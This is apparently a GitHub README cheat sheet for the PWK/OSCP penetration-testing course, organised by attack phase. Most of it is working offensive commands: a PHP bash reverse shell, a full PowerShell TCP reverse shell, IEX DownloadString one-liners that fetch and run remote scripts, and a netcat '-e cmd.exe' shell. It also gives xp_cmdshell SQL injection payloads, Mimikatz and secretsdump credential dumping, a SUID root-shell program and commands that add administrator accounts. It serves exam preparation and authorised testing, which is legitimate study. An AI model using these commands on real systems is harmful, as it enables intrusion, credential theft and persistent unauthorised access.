# JustTryHarder

JustTryHarder, a cheat sheet which will aid you through the PWK course & the OSCP Exam.

(Inspired by PayloadAllTheThings)

Feel free to submit a Pull Request & leave a star to share some love if this helped you. 💖

**Hacktoberfest friendly!**
Yes, we are open to Pull Requests for Hacktoberfest! Please ensure its not spam and actually contributes well to this repo. Thanks & happy hacking!

Disclaimer: None of the below includes spoilers for the PWK labs / OSCP Exam.

Credit Info:
I have obtained a lot of this info through other Github repos, blogs, sites and more.
I have tried to give as much credit to the original creator as possible, if I have not given you credit please contact me on Twitter: https://twitter.com/s1nfulz

## BOF (WIP)
----------------
(Typical bad characters include: 0x00, 0x0A, 0x0D)
- Fuzzing
- Finding eip position
- Finding bad chars
- Locating jmp esp
- Generating payload with msfvenom
- Getting reverse shell with netcat

Good BOF resources: 
- https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2016/june/writing-exploits-for-win32-systems-from-scratch/
- https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/
- https://github.com/justinsteven/dostackbufferoverflowgood
- https://veteransec.com/2018/09/10/32-bit-windows-buffer-overflows-made-easy/

## Breakouts / Environment Escapes
----------------
- https://www.pentestpartners.com/security-blog/breaking-out-of-citrix-and-other-restricted-desktop-environments/
- https://sra.io/blog/sitekiosk-breakout/
- https://www.trustedsec.com/blog/kioskpos-breakout-keys-in-windows/
- https://cognosec.com/breaking-out-of-citrix-environment/
- https://blog.netspi.com/breaking-out-of-applications-deployed-via-terminal-services-citrix-and-kiosks/
- https://research.nccgroup.com/wp-content/uploads/2020/07/research-insights_common-issues-with-environment-breakouts.pdf
- https://gracefulsecurity.com/citrix-breakout/

## DNS - Zone Transfers
----------------
- host -t axfr HTB.local 10.10.10.10
- host -l HTB.local 10.10.10.10
- host -l <domain name> <name server>
- dig @<dns server> <domain> axfr

## File Transfers
----------------

wget Transfer

How to retrieve file(s) from host (inside a reverse shell)

```bash
# Place file you want transferred in /var/www/html/
service apache2 start
# Run on the remote server
# wget http://10.10.10.10/pspy64 # <- for single file
# wget -r http://10.10.10.10/pspy64/ <- for folder
```
	
TFTP Transfer

(How to transfer from Kali to Windows)

Using MSF.

Start MSF before these steps:

Inside MSF

1. `use auxiliary/server/tftp`
2. `set TFTPROOT /usr/share/mimikatz/Win32/`
3. `run`

Inside a terminal

4. `tftp -i 10.10.10.10 GET mimikatz.exe`

NetCat (Windows to Kali)

1. Windows: `nc -nv 10.11.0.61 4444 < bank-account.zip`

2. Linux: `nc -nlvp 4444 > bank-account.zip`
	
PowerShell

```ps
Invoke-WebRequest -Uri http://127.0.0.1/exploit.py -OutFile C:\Users\Victim\exploit.py
```
	
Without an interactive powershell session:
```ps
# Create wget.ps1
$client = New-Object System.Net.WebClient
$path = "C:\path\to\save\file.txt"
$client.DownloadFile($url, $path)
```
Base64 (Linux -> Linux)

Local Host:
1. `$(echo "cat /path/to/exploit.py | base64") > encoded.b64`
2. Transfer `encoded.b64` to the remote server via `nc` or otherwise.

Remote Server - Linux:

3. `cat /path/to/encoded.b64 | base64 -d > exploit.py`

Remove Server - Powershell 
	
Certutil

```
certutil.exe -urlcache -split -f "http://ip.for.kali.box/file-to-get.zip" name-to-save-as.zip
```

Kerberoasting
----------------
- `GetUserSPNs.py -request -dc-ip <DC_IP> <domain\user>`

- `powershell.exe -NoP -NonI -Exec Bypass IEX (New-Object Net.WebClient).DownloadString(‘https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1');Invoke-Kerberoast -erroraction silentlycontinue -OutputFormat Hashcat`

- `impacket-secretsdump -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER> -outputfile filename.hashes`

LFI / RFI
----------------
PHP Reverse Shell:
<?phpexec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.10/1234 0>&1'");

Command Injection:
<?php echo shell_exec(whoami);?>
- For more info on LFI & RFI please refer to the LFI / RFI section at the top of the page ^

MSSQL / SQLi
----------------
- EXEC master..xp_cmdshell 'whoami';
- meh' exec master..xp_cmdshell 'whoami' --
- https://github.com/codingo/OSCP-2/blob/master/Documents/SQL%20Injection%20Cheatsheet.md
- http://pentestmonkey.net/category/cheat-sheet/sql-injection

Password Cracking
----------------
Hashcat
- `hashcat -m 500 -a 0 -o cracked_password.txt --force hash.txt /path/to/your/wordlist.txt`

John The Ripper
- `john --rules --wordlist=/path/to/your/wordlist.txt hash.txt`

Password Spraying (CrackMapExec)
----------------
- `cme smb 10.10.10.10 -u username -d domain -p password`

Payload Generation
----------------
- [NETSEC - Creating Payloads](https://netsec.ws/?p=331)
- [MsfVenom Cheatsheet](http://security-geek.in/2016/09/07/msfvenom-cheat-sheet/_)
- [Metasploit Unleashed Payloads](https://www.offensive-security.com/metasploit-unleashed/payloads/)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
- Non-staged: netcat
- Staged: multi/handler

PHP
----------------
- [The differences between `exec()`, `shell_exec`, `system()` and `passthru()`](https://stackoverflow.com/questions/20072696/what-is-different-between-exec-shell-exec-system-and-passthru-functions?lq=1)


Priv Esc - Linux
----------------
# If GCC & wget is installed, the system MIGHT be vulnerable to a kernel exploit
- [Linux Kernel Exploits](https://github.com/SecWiki/linux-kernel-exploits)
- [GTFObins - Break ~~the f**k~~ out of restricted shells](https://gtfobins.github.io)
   * GTFO Helper script: https://github.com/dreadnaughtsec/gtfo
- [Linux Exploit Suggester](https://github.com/InteliSecureLabs/Linux_Exploit_Suggester)
- [Linux Exploit Suggester 2](https://github.com/jondonas/linux-exploit-suggester-2)
- [Basic Linux Privilege Escalation](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- `grep -Ri 'password' .`
- `find / -perm –4000 2>/dev/null`
- `find / -perm -u=s 2>/dev/null`
- `find / -user root -perm -4000 -exec ls -ldb {} \;`
- `which awk perl python ruby gcc cc vi vim nmap find netcat nc wget tftp ftp 2>/dev/null`
(then ls -la, look for 777 file permissions).
- Custom SUID binary. Requires code execution as the target user. Example: mysql sys_eval as root.
```
#include<stdio.h>
#include<unistd.h>
#include<sys/types.h>

int main(){
    setuid(geteuid());
    system("/bin/bash");
    return 0;
}
```

Priv Esc - Windows
----------------
 - [Windows Privilege Escalation Fundamentals](http://www.fuzzysecurity.com/tutorials/16.html)
 - [Windows Privilege Escalation Guide](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
 - [PowerUp / PowerSploit](https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc)
 - [Powerless - Enumeration Tool](https://github.com/M4ximuss/Powerless)
 - [Local Privilege Escalation Workshop](https://github.com/sagishahar/lpeworkshop)
 - [Just Another Windows (Enum) Script / JAWS](https://github.com/411Hall/JAWS)
 - [Watson](https://github.com/rasta-mouse/Watson)
 - [Sherlock](https://github.com/rasta-mouse/Sherlock) (Deprecated)
 - [Windows Exploit Suggester](https://github.com/GDSSecurity/Windows-Exploit-Suggester)
 - `churrasco -d "net user /add <username> <password>"`
 - `churrasco -d "net localgroup administrators <username> /add"`
 - `churrasco -d "NET LOCALGROUP "Remote Desktop Users" <username> /ADD"`

Post Exploitation
----------------
1. Mimikatz.exe (run it)
2. privilege::debug
3. sekurlsa::logonpasswords

Port Forwarding
----------------

```
• Local -- Forward local port to remote host.
• Remote -- Forward remote port to local host.
• Dynamic -- Use SOCKS.

Use local if you have a service running on a machine that can be reached from the remote machine, and you want to access it directly from the local machine. After setting up the tunneling you will be able to access the service using your local host IP (127.0.0.1)

Use remote if you have a service that can be reached from the local machine, and you need to make it available to the remote machine. It opens the listening socket on the machine you have used SSH to log into. 

Dynamic is like local, but on the client side it behaves like a SOCKS proxy. Use it if you need to connect with a software that expects SOCKS forwarding.
```

Chisel
local system:
```
./chisel server -p 8080 --reverse
```

victim:
```
./chisel client YOUR_IP:8080 R:1234:127.0.0.1:1234
```

Plink
- WIP

SSH
- ssh user@10.10.10.10 -R 1234:127.0.0.1:1234
- ssh -D 1337 -q -C -N -f user@10.10.10.10 (https://ma.ttias.be/socks-proxy-linux-ssh-bypass-content-filters)

Socks Proxy (using PowerShell)
----------------
Local
- vi /etc/proxychains.conf
- socks5 <ip> 9080
- Import-Module .\Invoke-SocksProxy.psm1
- Invoke-SocksProxy -bindPort 9080
- proxychains nmap -sT <ip>
	
Port Scanning
----------------
TCP
- reconnoitre -t 10.10.10.10 -o . --services --quick --hostnames
- nmap -vvv -sC -sV -p- --min-rate 2000 10.10.10.10
- nmap -sT -p 22,80,110 -A 
- nmap -p- -iL ips.txt > TCP_Ports.txt 
- nc -v -n -z -w1 10.10.10.10 1-10000
- nmap -p- -iL ips.txt > AllTCPPorts.txt

UDP (can take hours so maybe netstat is a better alternative)
- nmap -sU --top-ports 10000
- nmap -sT -sU -p 22,80,110 -A 
- nmap -sT -sU -p- --min-rate 2000
- nmap -p- -sU -iL ips.txt > udp.txt 
- nmap -sU -sV -iL ips.txt > alludpports.txt 

SNMP
nmap -p161 -sU -iL ips.txt > udp.txt  (cmd could be wrong, double check)

SSH
nmap --script ssh2-enum-algos -iL ips.txt > SSH.txt 

SSL
nmap -v -v  --script ssl-cert,ssl-enum-ciphers,ssl-heartbleed,ssl-poodle,sslv2 -iL ips.txt > SSLScan.txt 

NMAP Bootstrap Report
nmap -oA poison --stylesheet nmap-bootstrap.xsl 10.10.10.10
firefox nmap-bootstrap.xsl

Ping Sweep
----------------
# Linux (basic one liners)
- for i in {1..254} ;do (ping -c 1 192.168.1.$i | grep "bytes from" &) ;done
- fping -g 192.168.0.1/24

# Linux (script)
```
for i in `seq 1 255`
do
    ping -c1 192.168.125.$i 2>/dev/null 1>&2
    if [[ $? -eq 0 ]]
    then
        echo 192.168.125.$i is up
    fi
done
```

# Windows (cmd)
- for /L %i in (1,1,255) do @ping -n 1 -w 200 192.168.1.%i > nul && echo 192.168.1.%i is up.

# Windows (PowerShell)
- $ping = New-Object System.Net.Networkinformation.Ping ; 1..254 | % { $ping.send("10.9.15.$_", 1) | where status -ne 'TimedOut' | select Address | fl * }

# Nmap
- nmap -sP 192.168.0.1-254

Pivoting
----------------
- sshuttle -r user@10.10.10.10 10.1.1.0/24

Remote Desktop
----------------
- rdesktop -u user -p password 10.10.10.10 -g 85% -r disk:share=/root/
- xfreerdp /d:xyz.local /u:username /p:password /v:10.10.10.10 /cert-ignore

Responder
----------------
- responder -I tun0 -wrF
- https://chryzsh.gitbooks.io/darthsidious/content/execution/responder-with-ntlm-relay-and-empire.html
- https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html

Reverse Shells
----------------
Linux
- http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
- https://awansec.com/reverse-shell.html

Windows
- https://github.com/Dhayalanb/windows-php-reverse-shell
- nc 10.10.10.10 4444 –e cmd.exe

Shell Upgrading
----------------

Source: https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/ & https://forum.hackthebox.eu/discussion/142/obtaining-a-fully-interactive-shell

SQL Injection (SQLmap)
----------------
- sqlmap -u "http://example.com/test.php?test=test" --level=5 --risk=3 --batch

#### Python
1. python -c 'import pty;spawn("/bin/bash");'
or
1. python3 -c 'import pty;spawn("/bin/bash");'
2. In reverse shell:
```
python -c 'import pty; pty.spawn("/bin/bash")'
Ctrl-Z

- In Kali

3. stty raw -echo
4. fg

- In reverse shell
5. reset (sometimes optional)
6. export SHELL=bash
7. export TERM=xterm-256color
8. stty rows <num> columns <cols> (optional)
(Sometimes the command will need to be executed: export TERM=xterm)
```

Using socat
```
#Listener:
socat file:`tty`,raw,echo=0 tcp-listen:4444
#Victim:
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444  
```

#### Perl
1. perl -e 'exec "/bin/sh";'
2. perl: exec "/bin/sh";

#### Bash
/bin/sh -i

Show listening ports
----------------
- Linux netstat syntax
	1. netstat -tulpn | grep LISTEN

- FreeBSD/MacOS X netstat syntax
	1. netstat -anp tcp | grep LISTEN
	2. netstat -anp udp | grep LISTEN
	
- OpenBSD netstat syntax

	1. netstat -na -f inet | grep LISTEN
	2. netstat -nat | grep LISTEN

- Nmap scan syntax
	1. sudo nmap -sT -O localhost
	2. sudo nmap -sU -O 192.168.2.13 ##[ list open UDP ports ]##
	3. sudo nmap -sT -O 192.168.2.13 ##[ list open TCP ports ]##

SMB - Enumeration
----------------
- https://0xdf.gitlab.io/2018/12/02/pwk-notes-smb-enumeration-checklist-update1.html
- smbmap -H 10.10.10.10
- smbclient -L 10.0.0.10
- smbclient //10.10.10.10/share$

SMB - Impacket
----------------
- Impacket's PSEXEC (After creating a remote port fwd)
/usr/share/doc/python-impacket/examples/psexec.py user@10.10.10.10

Password: (password)

[*] Trying protocol 445/SMB...

- Impacket's SMBServer (For File Transfer)
1. cd /usr/share/windows-binaries
2. python /usr/share/doc/python-impacket/examples/smbserver.py a .
3. \\\10.10.10.10\a\mimikatz.exe

SMTP Enumeration
----------------
https://github.com/s0wr0b1ndef/OSCP-note/blob/master/ENUMERATION/SMTP/smtp_commands.txt

ICMP Injection
----------------
1. ping -n 3 10.10.10.10
2. tcpdump -i tun0 icmp

VMware (not going full screen)
----------------
```systemctl restart open-vm-tools.service```

Web Servers:
----------------
- python -m SimpleHTTPServer 80
- python3 -m http.server 80
- ngrok http "file:///C:\Users\sinfulz\Public Folder"
- php -S 0.0.0.0:80

Web Scanning:
----------------
Web Scanning with extensions

Linux (Example web server might be Apache)
```gobuster dir -e -u http://10.10.10.10/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,js,txt,jsp,pl -s 200,204,301,302,307,403,401```

Windows (Example web server might be IIS)

```gobuster dir -e -u http://10.10.10.10/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,js,txt,asp,aspx,jsp,bak -s 200,204,301,302,307,403,401```

Linux (Example web server might be Apache) 

```python3 dirsearch.py -r -u http://10.10.10.131/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -e php,html,js,txt,jsp,pl -t 50```

Windows (Example web server might be IIS)

```python3 dirsearch.py -r -u http://10.10.10.131/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -e php,html,js,txt,asp,aspx,jsp,bak -t 50```

HTTP
```gobuster dir -u http://10.10.10.10 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php,html,txt -t 69```

HTTPS
```gobuster dir -k -u https://10.10.10.10/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 69```
(in some cases --wildcard will need to be used instead of -k)

Nikto
```nikto -h 10.10.10.10 -p 80```

Nikto HTTPS
``nikto -h 10.10.10.10 -p 443```

WFuzz
```wfuzz -u http://10.10.10.10/hello.php?dir=../../../../../../../../../FUZZ%00 -w /usr/share/wfuzz/wordlist/general/common.txt```

Web Shells
----------------
- https://github.com/Arrexel/phpbash
- https://github.com/flozz/p0wny-shell

WordPress
----------------
- https://forum.top-hat-sec.com/index.php?topic=5758.0

Windows Framework / Powershell
----------------
bypass PowerShell execution policy
- Bypassing execution policy and executing a script:
```powershell -ExecutionPolicy ByPass -File script.ps1```

----------------
- https://github.com/samratashok/nishang
- https://github.com/rasta-mouse/Sherlock
- Reverse Powershell: (sometimes powershell or echo may need to be infront of the string and sometimes quotes may be needed, e.g. powershell IEX or powershell "IEX..etc" or echo IEX).
```
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.1.3.40',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```
- If one has a Command Prompt shell, this will grab PowerUp from a local web server and run it on the compromised shell:
```
echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.10.10:80/PowerUp.ps1') | powershell -noprofile -
```
```
IEX(New-object Net.WebClient).DownloadString('http://10.10.10.10:80/PowerUp.ps1')

```
```
powershell -nop -exec bypass IEX "(New-Object Net.WebClient).DownloadString('http://10.10.14.x/Whatever.ps1'); Invoke-Whatever"
```
- Reverse Powershell using mssql:
```
xp_cmdshell powershell IEX(New-Object Net.WebClient).downloadstring(\"http://10.10.10.10/Nishang-ReverseShell.ps1\")
```
- File transfer with PowerShell:
```
powershell -c IEX(New-Object Net.WebClient).DownloadFile('http://server/path/to/file', 'nameforefile')`
```
Windows Post Exploitation Commands
----------------
- WMIC USERACCOUNT LIST BRIEF
- net user
- net localgroup Users
- net localgroup Administrators
- net user USERNAME NEWPASS /add
- net user "USER NAME" NEWPASS /add
- net localgroup administrators USERNAME /add

Writeable Directories
# Windows
----------------
list from https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/Generic-AppLockerbypasses.md
The following folders are by default writable by normal users (depends on Windows version - This is from W10 1803)
```
C:\Windows\Tasks
C:\Windows\Temp
C:\windows\tracing
C:\Windows\Registration\CRMLog
C:\Windows\System32\FxsTmp
C:\Windows\System32\com\dmp
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\PRINTERS
C:\Windows\System32\spool\SERVERS
C:\Windows\System32\spool\drivers\color
C:\Windows\System32\Tasks\Microsoft\Windows\SyncCenter
C:\Windows\System32\Tasks_Migrated (after peforming a version upgrade of Windows 10)
C:\Windows\SysWOW64\FxsTmp
C:\Windows\SysWOW64\com\dmp
C:\Windows\SysWOW64\Tasks\Microsoft\Windows\SyncCenter
C:\Windows\SysWOW64\Tasks\Microsoft\Windows\PLA\System
```

# Linux
To find World Writeable Directories in Linux use the command:
```find / -xdev -type d \( -perm -0002 -a ! -perm -1000 \) -print```

Todo List:
----------------
- Improve the readability of the cheatsheet
- Fill in the empty sections
- Remove unnecessary sections
- Integrate the files in the repo into the cheatsheet
- Migrate to GitBook
- Include screenshots/gifs into the cheatsheet if needed

Thank you:
----------------
# Thanks to these people for including my cheatsheet on their site/page:
- https://khaoticdev.net/cheatsheets/#ad
- https://www.facebook.com/ncybersec/posts/1541830509321001
- https://www.facebook.com/cyberg0100/posts/github-sinfulzjusttryharder-justtryharder-a-cheat-sheet-which-will-aid-you-throu/653235345249466
- https://www.reddit.com/r/CyberSpaceVN/comments/f3n2wp/github_sinfulzjusttryharder_justtryharder_a_cheat
- https://xn4k.github.io/pentest/PWK-course-&-the-OSCP-Exam-Cheatsheet/
- https://opensourcelibs.com/libs/pentesting-tools
- https://gitmemory.com/brhannah
- https://www.bugbountytips.tech/2020/08/23/justtryharderpwk-cheatsheetkali-linux-cheatsheethydra-cheatsheetsecu-2/
- 
